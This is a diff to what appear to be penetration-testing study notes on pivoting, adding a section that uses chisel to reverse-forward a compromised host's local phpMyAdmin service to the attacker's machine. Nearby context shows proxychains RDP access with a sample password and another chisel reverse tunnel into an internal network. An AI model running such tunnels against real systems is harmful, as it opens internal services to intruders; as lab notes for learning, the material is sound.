@@ -121,6 +121,18 @@ attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 
 
+### Port Forwarding localhost Web Service (phpmyadmin)
+
+If the server we popped a shell on is running phpmyadmin its work portforwarding back to our host.
+
+```powershell
+.\chisel.exe client 192.168.45.170:8081 R:8090:localhost:80
+```
+
+Navigating to localhost:8090, we can now access the admin portal
+
+<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
 ### **Port Forwarding an Internal Web Service.**
 
 Sometimes we may want to port foward a direct port back to our reverse port forward. We can use the syntax: **R:localport:remotehost:remoteport.**
@@ -139,3 +151,4 @@ C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
 <figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We may need to upate our /etc/hosts to fit the domain name.
+
